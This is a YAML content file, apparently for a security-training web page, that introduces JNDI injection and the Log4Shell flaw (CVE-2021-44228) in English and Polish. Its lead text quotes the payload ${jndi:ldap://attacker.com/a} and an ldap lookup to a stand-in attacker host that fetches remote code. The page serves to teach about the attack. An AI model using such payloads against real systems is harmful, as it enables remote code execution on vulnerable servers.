hero:
  titleMain: 'JNDI '
  titleGrad: Injection
  titleTail: ' (Log4Shell)'
  topbar: JNDI Injection (Log4Shell)
  lead:
    en: 'JNDI is designed to fetch and instantiate remote Java objects — a lookup like ldap://attacker.com/Exploit isn''t malformed syntax to escape, it''s a well-formed request to a feature working exactly as built. Log4Shell weaponized this at internet scale: Log4j 2''s message-lookup substitution meant merely logging an attacker string like ${jndi:ldap://attacker.com/a} — a User-Agent header, a chat message — triggered a remote class fetch and code execution. CVE-2021-44228 scored a perfect CVSS 10.0 and CISA issued Emergency Directive 22-02, one of the few ever issued for a single library flaw.'
    pl: 'JNDI zostało zaprojektowane, by pobierać i tworzyć instancje zdalnych obiektów Java — lookup taki jak ldap://attacker.com/Exploit to nie zniekształcona składnia do ominięcia, to poprawnie sformułowane żądanie do funkcji działającej dokładnie tak jak zaprojektowano. Log4Shell uzbroiło to w skali internetu: podstawianie lookupów w wiadomościach Log4j 2 oznaczało, że samo zalogowanie stringa atakującego jak ${jndi:ldap://attacker.com/a} — nagłówek User-Agent, wiadomość na czacie — wyzwalało pobranie zdalnej klasy i wykonanie kodu. CVE-2021-44228 uzyskało idealne CVSS 10.0, a CISA wydała Emergency Directive 22-02, jedną z niewielu kiedykolwiek wydanych dla pojedynczej luki w bibliotece.'
